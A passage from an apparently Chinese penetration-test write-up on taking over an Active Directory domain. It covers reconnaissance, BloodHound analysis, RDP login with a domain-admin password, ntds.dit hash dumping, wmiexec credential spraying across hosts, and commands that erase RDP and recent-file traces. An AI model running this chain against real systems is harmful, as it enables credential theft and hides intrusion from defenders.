### 0X04 域信息收集

查看当前域管理员组，发现psvadmin为域管理员。

```
`net group "Domain admins" /domain`
```

![](../Images/df979996bc738ff3d2ddf31e73e06041.png)

查询信任域。

```
`nltest /domain_trusts`
```

![](../Images/6a4bada5902964047077c2a9f9adf3bf.png)

1.  pxxxxxxx.local为主域。
    
2.  pxx.local为子域。
    

定位域控机器。

```
`nltest /dclist:domainname`
```

![](../Images/3a4a034500fdd872da680a8bd19ecc10.png)

其中HWC-ADSRV-P01为主域控机器,但没有找到子域的域控。  

![](../Images/599cf15f1fba79dc91c7a80b68989e4e.png)

查询主域控机器的ip地址。

```
`ping HWC-ADSRV-P01`
```

  

![](../Images/39e1b45efd75ea7e9c8a44d1cb71cdb5.png)

通过spn查询域pxxxxxxx.local结构。

```
`setspn -T pxxxxxxx.local -Q */* >spn.txt`
```

![](../Images/f693faad51184616b0f8241180ddf957.png)

并统计域内主机数量，好家伙，3167台。

```
`grep "CN=" spn.txt | awk -F "," &#123;'print $1'&#125; | awk -F "=" &#123;'print $2'&#125; > host.txt`
```

![](../Images/3331f10e40142234c4b58df8ab526429.png)

spn看起来太麻烦了，所以使用ADExplorer连接域控机器并导出域结构，ADExplorerSnapshot.py转换json格式，并将其导入Bloodhound，进行可视化分析，3113台机器，4897个用户。

![](../Images/73afb872b237a9967f2d38c8267f246c.png)

**Bloodhound**

当前用户是psvadmin，我们的目标是域控机器的最高权限，再Bloodhound中填入开始节点为psvadmin用户和目标节点为域控机器名，它会为我们规划出一条攻击路径。

![](../Images/eb98a0fa47df98207a31103051510e7e.png)

**攻击路径**

我们可以看到psvadmin用户是域管理员组的一名成员，比较简单，所以直接可以登录域控机器。

###   域渗透

当前为C类ip段，Ladon扫描内网存活主机。

![](../Images/505afa8d9e9c50c43e4bf5b1a9371ef5.png)

**Ladon**

隧道已经搭建好了，拥有域管理员psvadmin明文账号密码，直接远程登录主域控机器。

![](../Images/c738d403e183c0c1acb082862db3b465.png)

**mstsc**

接下来就是使用NTDSUTIL拍摄ntds.dit的快照，使用NTDSDumpEx导出该域用户的全部hash即可。  
最后使用wmiexec进行密码喷洒即可。

```
`FOR /F %i in (ip.txt) do wmiexec Pxxxxxxx/psvadmin:xxxxxxx@%i whoami`
```

![](../Images/e664998bc535d9cb43a425376f97c723.png)**密码喷洒**

###  0X06 痕迹清理

```
` //删除注册表"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"  /va /f"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"  /f"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"//删除缓存文件cd   %userprofile%\documents\`
```

```
`del /f /s /q “%userprofile%\Recent*.*`
```

##   0X07 总结

1.  做好前期的信息收集，信息收集越好，打点也就越容易。
    
2.  内网渗透不要依赖于Cobalt strike和MSF这种框架工具，多手动操作一下，可以对加深对原理的理解，掌握原理才能做到游刃有余。
    
3.  多学习各种渗透姿势，不要只局限于一种渗透方式，毕竟内网的主机漏洞越来越少，即使有，成功率也不高。
    
4.  不要做任何破坏性动作，注意最后的痕迹清理工作。
